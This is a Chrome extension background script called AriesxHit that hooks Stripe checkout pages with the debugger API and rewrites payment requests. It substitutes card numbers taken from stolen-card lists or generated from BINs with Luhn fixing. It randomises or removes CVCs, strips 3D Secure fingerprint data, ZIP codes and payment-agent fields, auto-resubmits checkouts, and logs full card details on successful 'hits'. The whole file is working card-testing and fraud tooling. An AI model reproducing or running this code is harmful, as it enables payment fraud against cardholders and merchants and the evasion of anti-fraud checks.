// ===================================
// BACKGROUND.JS
// AriesxHit - WebRequest + Debugger API Combined
// ===================================

// ==================== STATE ====================

const state = {
  binList: [],
  cardList: [],
  currentBinIndex: 0,
  bypassActive: false,
  autoHitActive: false,
  userClickedSubmit: false,
  retryInProgress: false,
  logs: [],
  stats: { hits: 0, tested: 0, declined: 0 },
  settings: {
    cvcModifier: 'generate',
    customCvc: '',
    remove3dsFingerprint: true,
    removePaymentAgent: false,
    removeZipCode: false,
    blockAnalytics: false
  }
};

// Tab tracking maps
const tabCardIndexMap = new Map();
const tabCardDetailsMap = new Map();
const tabSuccessUrlMap = new Map();
const tabCheckoutType = new Map();
const debuggerAttachedTabs = new Set();
const stripeDetectedTabs = new Set();

// ==================== CARD GENERATOR ====================

const CardGen = {
  fromBin(binInput) {
    if (!binInput) return null;
    
    const parts = binInput.trim().split('|');
    const binPattern = parts[0].replace(/[^0-9xX]/g, '');
    const expMonth = parts[1]?.trim();
    const expYear = parts[2]?.trim();
    const cvvPattern = parts[3]?.trim();

    // Pad to 16 if needed
    let pattern = binPattern;
    if (pattern.length < 16) {
      pattern += 'x'.repeat(16 - pattern.length);
    }

    // Generate number
    let number = '';
    for (let i = 0; i < 16; i++) {
      const c = pattern[i];
      number += (c?.toLowerCase() === 'x') ? Math.floor(Math.random() * 10) : (c || Math.floor(Math.random() * 10));
    }

    // Fix Luhn checksum
    number = this.fixLuhn(number);

    return {
      number,
      month: this.genMonth(expMonth),
      year: this.genYear(expYear),
      cvv: this.genCvv(cvvPattern)
    };
  },

  fixLuhn(num) {
    const digits = num.split('').map(Number);
    let sum = 0;
    for (let i = 0; i < 15; i++) {
      let d = digits[i];
      if ((15 - i) % 2 === 1) {
        d *= 2;
        if (d > 9) d -= 9;
      }
      sum += d;
    }
    const check = (10 - (sum % 10)) % 10;
    return num.slice(0, 15) + check;
  },

  genMonth(m) {
    if (m && /^\d{1,2}$/.test(m)) {
      const month = parseInt(m);
      if (month >= 1 && month <= 12) return month.toString().padStart(2, '0');
    }
    return (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0');
  },

  genYear(y) {
    const now = new Date().getFullYear();
    if (y && /^\d{2,4}$/.test(y)) {
      let year = parseInt(y);
      if (year < 100) year += 2000;
      if (year >= now) return (year % 100).toString().padStart(2, '0');
    }
    return ((now + Math.floor(Math.random() * 5) + 1) % 100).toString().padStart(2, '0');
  },

  genCvv(pattern) {
    if (pattern && /^\d{3,4}$/.test(pattern)) return pattern;
    return Math.floor(100 + Math.random() * 900).toString();
  },

  randomCvv() {
    return Math.floor(100 + Math.random() * 900).toString();
  }
};

// ==================== INIT ====================

chrome.storage.local.get([
  'binList', 'cardList', 'logs', 'stats',
  'settings_cvcModifier', 'settings_customCvc',
  'settings_remove3dsFingerprint', 'settings_removePaymentAgent',
  'settings_removeZipCode', 'settings_blockAnalytics'
], (r) => {
  if (r.binList) state.binList = r.binList;
  if (r.cardList) state.cardList = r.cardList;
  if (r.logs) state.logs = r.logs;
  if (r.stats) state.stats = r.stats;
  if (r.settings_cvcModifier) state.settings.cvcModifier = r.settings_cvcModifier;
  if (r.settings_customCvc) state.settings.customCvc = r.settings_customCvc;
  if (r.settings_remove3dsFingerprint !== undefined) state.settings.remove3dsFingerprint = r.settings_remove3dsFingerprint;
  if (r.settings_removePaymentAgent !== undefined) state.settings.removePaymentAgent = r.settings_removePaymentAgent;
  if (r.settings_removeZipCode !== undefined) state.settings.removeZipCode = r.settings_removeZipCode;
  if (r.settings_blockAnalytics !== undefined) state.settings.blockAnalytics = r.settings_blockAnalytics;
  log('info', '⚡ AriesxHit Ready');
});

chrome.storage.onChanged.addListener((changes) => {
  if (changes.binList) state.binList = changes.binList.newValue || [];
  if (changes.cardList) state.cardList = changes.cardList.newValue || [];
  if (changes.settings_cvcModifier) state.settings.cvcModifier = changes.settings_cvcModifier.newValue;
  if (changes.settings_customCvc) state.settings.customCvc = changes.settings_customCvc.newValue;
  if (changes.settings_remove3dsFingerprint) state.settings.remove3dsFingerprint = changes.settings_remove3dsFingerprint.newValue;
  if (changes.settings_removePaymentAgent) state.settings.removePaymentAgent = changes.settings_removePaymentAgent.newValue;
  if (changes.settings_removeZipCode) state.settings.removeZipCode = changes.settings_removeZipCode.newValue;
  if (changes.settings_blockAnalytics) state.settings.blockAnalytics = changes.settings_blockAnalytics.newValue;
});

// ==================== WEBREQUEST API ====================
// Used for: Observing requests, blocking analytics, detecting checkout

// WebRequest observer (MV3 - no blocking, just detection)
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    const url = details.url;
    
    // Detect Stripe checkout
    if (url.includes('checkout.stripe.com') || url.includes('buy.stripe.com') || url.includes('js.stripe.com')) {
      if (details.tabId > 0 && !stripeDetectedTabs.has(details.tabId)) {
        stripeDetectedTabs.add(details.tabId);
        
        // Attach debugger for this tab
        if (!debuggerAttachedTabs.has(details.tabId)) {
          attachDebugger(details.tabId);
        }
      }
    }
    
    // Detect payment request - attach debugger
    if (url.includes('stripe.com/v1/payment_methods') || url.includes('stripe.com/v1/tokens')) {
      if (!debuggerAttachedTabs.has(details.tabId) && details.tabId > 0) {
        attachDebugger(details.tabId);
      }
    }
  },
  { urls: ['*://*.stripe.com/*'] }
);

// Observe responses to detect 3DS
chrome.webRequest.onCompleted.addListener(
  (details) => {
    const url = details.url;
    
    // Detect 3DS redirect
    if (url.includes('authenticate') || url.includes('3ds') || url.includes('three-d-secure')) {
      if (details.tabId > 0) {
        tabCheckoutType.set(details.tabId, '3d');
        notifyTab(details.tabId, { type: 'UPDATE_CHECKOUT_TYPE', checkoutType: '3d' });
        log('warning', '🔒 3D Secure Detected');
      }
    }
  },
  { urls: ['*://*.stripe.com/*'] }
);

// ==================== DEBUGGER API ====================
// Used for: Modifying request bodies, reading response bodies

function attachDebugger(tabId) {
  if (debuggerAttachedTabs.has(tabId) || tabId <= 0) return;
  
  chrome.debugger.attach({ tabId }, '1.3', () => {
    if (chrome.runtime.lastError) {
      console.log('Debugger attach failed:', chrome.runtime.lastError);
      return;
    }
    
    debuggerAttachedTabs.add(tabId);
    
    chrome.debugger.sendCommand({ tabId }, 'Fetch.enable', {
      patterns: [
        { urlPattern: '*stripe.com/v1/payment_methods*', requestStage: 'Request' },
        { urlPattern: '*stripe.com/v1/tokens*', requestStage: 'Request' },
        { urlPattern: '*stripe.com/v1/sources*', requestStage: 'Request' },
        { urlPattern: '*stripe.com/v1/payment_intents*', requestStage: 'Request' }
      ]
    });
    
    chrome.debugger.sendCommand({ tabId }, 'Network.enable');
    
    log('info', '🔗 Connected to checkout');
  });
}

chrome.debugger.onEvent.addListener((source, method, params) => {
  const tabId = source.tabId;
  if (!tabId || !debuggerAttachedTabs.has(tabId)) return;
  
  if (method === 'Fetch.requestPaused') {
    handleFetchPaused(tabId, params);
  } else if (method === 'Network.responseReceived') {
    handleNetworkResponse(tabId, params);
  }
});

chrome.debugger.onDetach.addListener((source) => {
  debuggerAttachedTabs.delete(source.tabId);
});

// ==================== REQUEST MODIFICATION ====================

async function handleFetchPaused(tabId, params) {
  const { requestId, request } = params;
  const url = request.url;
  const method = request.method;
  
  // Only modify POST requests to payment endpoints
  if (method !== 'POST' || !request.postData) {
    chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', { requestId });
    return;
  }
  
  // Check if bypass/autohit is active
  if (!state.bypassActive && !state.autoHitActive) {
    chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', { requestId });
    return;
  }
  
  // Get card
  const card = await getCard(tabId);
  if (!card) {
    log('error', '🔚 No cards available');
    notifyTab(tabId, { type: 'show_notification', message: '🔚 Card list ended', messageType: 'error' });
    chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', { requestId });
    return;
  }
  
  // Parse body
  const body = new URLSearchParams(request.postData);
  
  // === CARD SUBSTITUTION ===
  body.set('card[number]', card.number);
  body.set('card[exp_month]', card.month);
  body.set('card[exp_year]', card.year);
  
  // Also try payment_method_data format
  if (body.has('payment_method_data[card][number]')) {
    body.set('payment_method_data[card][number]', card.number);
    body.set('payment_method_data[card][exp_month]', card.month);
    body.set('payment_method_data[card][exp_year]', card.year);
  }
  
  // === CVC MODIFIER ===
  const cvcResult = applyCvc(card.cvv, body);
  
  // === 3DS BYPASS ===
  if (state.settings.remove3dsFingerprint) {
    bypass3ds(body);
  }
  
  // === REMOVE PAYMENT AGENT ===
  if (state.settings.removePaymentAgent) {
    ['payment_user_agent', 'referrer'].forEach(k => body.delete(k));
    for (const [key] of body) {
      if (key.startsWith('client_attribution_metadata')) body.delete(key);
    }
  }
  
  // === REMOVE ZIP ===
  if (state.settings.removeZipCode) {
    body.delete('billing_details[address][postal_code]');
    body.delete('card[address_zip]');
    body.delete('payment_method_data[billing_details][address][postal_code]');
  }
  
  // Encode modified body
  const newBody = body.toString();
  const headers = [
    { name: 'Content-Type', value: 'application/x-www-form-urlencoded' },
    { name: 'Content-Length', value: newBody.length.toString() }
  ];
  
  // Copy other headers
  if (request.headers) {
    for (const [name, value] of Object.entries(request.headers)) {
      if (name.toLowerCase() !== 'content-type' && name.toLowerCase() !== 'content-length') {
        headers.push({ name, value });
      }
    }
  }
  
  const postDataBase64 = btoa(unescape(encodeURIComponent(newBody)));
  
  // Send modified request
  chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', {
    requestId,
    method,
    postData: postDataBase64,
    headers
  }, () => {
    // Store card for this tab
    tabCardDetailsMap.set(tabId, card);
    
    // Log
    const cvcName = { remove: 'Remove', generate: 'Generate', nothing: 'Nothing', custom: 'Custom' }[state.settings.cvcModifier] || 'Generate';
    const fullCard = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
    log('info', `💳 ${fullCard} (gen) [CVC: ${cvcName}]`);
    
    notifyTab(tabId, { 
      type: 'show_notification', 
      message: `💳 ${card.number.slice(0,6)}****${card.number.slice(-4)}`, 
      messageType: 'info' 
    });
    
    state.stats.tested++;
    chrome.storage.local.set({ stats: state.stats });
    
    // Auto retry
    triggerRetry(tabId);
  });
}

// ==================== RESPONSE HANDLING ====================

function handleNetworkResponse(tabId, params) {
  const { requestId, response } = params;
  const url = response.url;
  
  if (!url.includes('api.stripe.com') && !url.includes('stripe.com/v1')) return;
  
  const contentType = response.headers['content-type'] || response.headers['Content-Type'] || '';
  if (!contentType.includes('application/json')) return;
  
  chrome.debugger.sendCommand({ tabId }, 'Network.getResponseBody', { requestId }, (result) => {
    if (!result?.body) return;
    
    try {
      const bodyStr = result.base64Encoded ? atob(result.body) : result.body;
      const data = JSON.parse(bodyStr);
      
      processResponse(tabId, data);
    } catch (e) {
      console.log('Response parse error:', e);
    }
    
    triggerRetry(tabId);
  });
}

function processResponse(tabId, data) {
  // Store success URL
  if (data.success_url) {
    tabSuccessUrlMap.set(tabId, data.success_url);
  }
  
  // Check for 3DS requirement
  if (data.status === 'requires_action' || data.next_action) {
    tabCheckoutType.set(tabId, '3d');
    log('warning', '🔐 Stripe: 3D Secure Required');
    notifyTab(tabId, { type: 'UPDATE_CHECKOUT_TYPE', checkoutType: '3d' });
    notifyTab(tabId, { type: 'show_notification', message: '🔐 3D Secure Required', messageType: 'warning' });
    return;
  }
  
  // Check for errors
  const error = data.error || data.payment_intent?.last_payment_error;
  if (error) {
    const code = error.decline_code || error.code || 'declined';
    log('error', `❌ Stripe: ${code}`);
    notifyTab(tabId, { type: 'show_notification', message: `❌ ${code}`, messageType: 'error' });
    state.stats.declined++;
    chrome.storage.local.set({ stats: state.stats });
    return;
  }
  
  // Check for success
  const status = data.status?.toLowerCase();
  if (status === 'succeeded' || status === 'success') {
    handleSuccess(tabId);
  }
}

function handleSuccess(tabId) {
  const card = tabCardDetailsMap.get(tabId);
  
  log('success', '✅ Stripe: Payment Successful');
  log('success', '🎉 HIT DETECTED');
  
  if (card) {
    log('success', `💎 ${card.number}|${card.month}|${card.year}|${card.cvv}`);
    tabCardDetailsMap.delete(tabId);
  }
  
  notifyTab(tabId, { type: 'show_notification', message: '🎉 Payment Success!', messageType: 'success' });
  
  state.stats.hits++;
  state.userClickedSubmit = false;
  
  chrome.storage.local.set({ stats: state.stats });
  broadcast({ type: 'STATS_UPDATE', hits: state.stats.hits });
  broadcast({ type: 'MODE_UPDATE', mode: 'HIT!' });
}

// ==================== CARD LOGIC ====================

async function getCard(tabId) {
  // From card list
  if (state.cardList?.length > 0) {
    let idx = tabCardIndexMap.get(tabId) || 0;
    if (idx >= state.cardList.length) return null;
    
    const [number, month, year, cvv] = state.cardList[idx].split('|');
    tabCardIndexMap.set(tabId, idx + 1);
    return { number, month, year, cvv };
  }
  
  // From BIN list
  if (state.binList?.length > 0) {
    const bin = state.binList[state.currentBinIndex % state.binList.length];
    state.currentBinIndex++;
    return CardGen.fromBin(bin);
  }
  
  return null;
}

function applyCvc(originalCvv, body) {
  const cvcKeys = ['card[cvc]', 'payment_method_data[card][cvc]', 'source[card][cvc]'];
  
  for (const key of cvcKeys) {
    switch (state.settings.cvcModifier) {
      case 'remove':
        body.delete(key);
        break;
      case 'generate':
        body.set(key, CardGen.randomCvv());
        break;
      case 'custom':
        if (state.settings.customCvc) body.set(key, state.settings.customCvc);
        break;
      case 'nothing':
      default:
        if (body.has(key) || originalCvv) body.set(key, originalCvv);
        break;
    }
  }
}

function bypass3ds(body) {
  for (const [key, value] of body) {
    if (key.includes('three_d_secure') && key.includes('device_data')) {
      try {
        let decoded = decodeURIComponent(value);
        let obj = JSON.parse(atob(decoded));
        
        // Remove fingerprints
        delete obj.browser_locale;
        delete obj.timezone;
        delete obj.user_agent;
        delete obj.screen_width;
        delete obj.screen_height;
        delete obj.color_depth;
        delete obj.language;
        delete obj.java_enabled;
        delete obj.javascript_enabled;
        delete obj.time_zone;
        
        body.set(key, encodeURIComponent(btoa(JSON.stringify(obj))));
      } catch (e) {}
      break;
    }
  }
}

// ==================== RETRY ====================

function triggerRetry(tabId) {
  if (state.userClickedSubmit && !state.retryInProgress) {
    state.retryInProgress = true;
    
    setTimeout(() => {
      chrome.tabs.sendMessage(tabId, { type: 'trigger_retry', selector: '.SubmitButton' }, () => {
        state.retryInProgress = false;
      });
    }, 2000);
  }
}

// ==================== TAB MANAGEMENT ====================

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url?.includes('cs_live') || tab.url?.includes('buy.stripe.com') || tab.url?.includes('checkout.stripe.com')) {
    injectScripts(tabId);
    if (!debuggerAttachedTabs.has(tabId)) attachDebugger(tabId);
  }
  
  // Check success URL
  if (changeInfo.status === 'complete') {
    const successUrl = tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url?.startsWith(successUrl)) {
      handleSuccess(tabId);
    }
  }
});

chrome.tabs.onRemoved.addListener((tabId) => {
  if (debuggerAttachedTabs.has(tabId)) {
    chrome.debugger.detach({ tabId }, () => {});
    debuggerAttachedTabs.delete(tabId);
  }
  tabCardIndexMap.delete(tabId);
  tabCardDetailsMap.delete(tabId);
  tabSuccessUrlMap.delete(tabId);
  tabCheckoutType.delete(tabId);
  stripeDetectedTabs.delete(tabId);
});

function injectScripts(tabId) {
  chrome.scripting.executeScript({
    target: { tabId, allFrames: true },
    files: ['scripts/content/stripe-detector.js']
  }).catch(() => {});
}

// ==================== UTILITIES ====================

function log(type, message) {
  const entry = { type, message, timestamp: Date.now() };
  state.logs.push(entry);
  if (state.logs.length > 500) state.logs.shift();
  chrome.storage.local.set({ logs: state.logs });
  broadcast({ type: 'LOG_UPDATE', logType: type, message });
}

function notifyTab(tabId, msg) {
  chrome.tabs.sendMessage(tabId, msg).catch(() => {});
}

function broadcast(msg) {
  chrome.runtime.sendMessage(msg).catch(() => {});
}

// ==================== MESSAGES ====================

chrome.runtime.onMessage.addListener((msg, sender, respond) => {
  const tabId = sender.tab?.id;
  
  switch (msg.type) {
    case 'user_clicked_submit':
      state.userClickedSubmit = true;
      respond({ success: true });
      break;
      
    case 'START_BYPASS':
      state.bypassActive = true;
      if (msg.data?.bins) {
        state.binList = msg.data.bins;
        state.currentBinIndex = 0;
        chrome.storage.local.set({ binList: state.binList });
      }
      log('success', `🔓 Bypass ON [CVC: ${state.settings.cvcModifier}]`);
      respond({ success: true });
      break;
      
    case 'STOP_BYPASS':
      state.bypassActive = false;
      log('info', '⏹️ Bypass OFF');
      respond({ success: true });
      break;
      
    case 'START_AUTO_HIT':
      state.autoHitActive = true;
      state.cardList = msg.data?.cards || [];
      tabCardIndexMap.clear();
      log('success', `🚀 Auto Hit ON (${state.cardList.length} cards)`);
      respond({ success: true });
      break;
      
    case 'STOP_AUTO_HIT':
      state.autoHitActive = false;
      log('info', '⏹️ Auto Hit OFF');
      respond({ success: true });
      break;
      
    case 'SET_BIN_LIST':
      state.binList = Array.isArray(msg.bins) ? msg.bins : 
        msg.bins.split('\n').map(b => b.trim()).filter(b => b.length >= 6);
      state.currentBinIndex = 0;
      chrome.storage.local.set({ binList: state.binList });
      log('info', `📋 ${state.binList.length} BINs loaded`);
      respond({ success: true });
      break;
      
    case 'UPDATE_SETTINGS':
      Object.assign(state.settings, msg.settings);
      for (const [k, v] of Object.entries(msg.settings)) {
        chrome.storage.local.set({ [`settings_${k}`]: v });
      }
      respond({ success: true });
      break;
      
    case 'GET_SETTINGS':
      respond({ settings: state.settings });
      break;
      
    case 'GET_LOGS':
      respond({ logs: state.logs, stats: state.stats });
      break;
      
    case 'CLEAR_LOGS':
      state.logs = [];
      chrome.storage.local.set({ logs: [] });
      respond({ success: true });
      break;
      
    case 'GET_STATS':
      respond(state.stats);
      break;
      
    case 'GET_AUTO_HIT_STATE':
      respond({ active: state.autoHitActive });
      break;
      
    case 'GET_BYPASS_STATE':
      respond({ active: state.bypassActive });
      break;
      
    case 'CHECKOUT_DETECTED':
      if (tabId) tabCheckoutType.set(tabId, msg.checkoutType || '2d');
      log('info', `🔍 ${(msg.checkoutType || '2d').toUpperCase()} Checkout`);
      respond({ success: true });
      break;
      
    case '3DS_DETECTED':
      if (tabId) tabCheckoutType.set(tabId, '3d');
      log('warning', '🔒 3D Secure Detected');
      respond({ success: true });
      break;
      
    default:
      respond({ error: 'Unknown' });
  }
  
  return true;
});

// Extension icon click
chrome.action.onClicked.addListener(async () => {
  const tabs = await chrome.tabs.query({ url: chrome.runtime.getURL('popup.html') });
  if (tabs.length > 0) {
    chrome.tabs.update(tabs[0].id, { active: true });
    chrome.windows.update(tabs[0].windowId, { focused: true });
  } else {
    const auth = await chrome.storage.local.get(['auth_token', 'user_data']);
    chrome.tabs.create({ 
      url: chrome.runtime.getURL(auth.auth_token ? 'popup.html' : 'login.html') 
    });
  }
});

console.log('[AriesxHit] Background Ready - WebRequest + Debugger API');
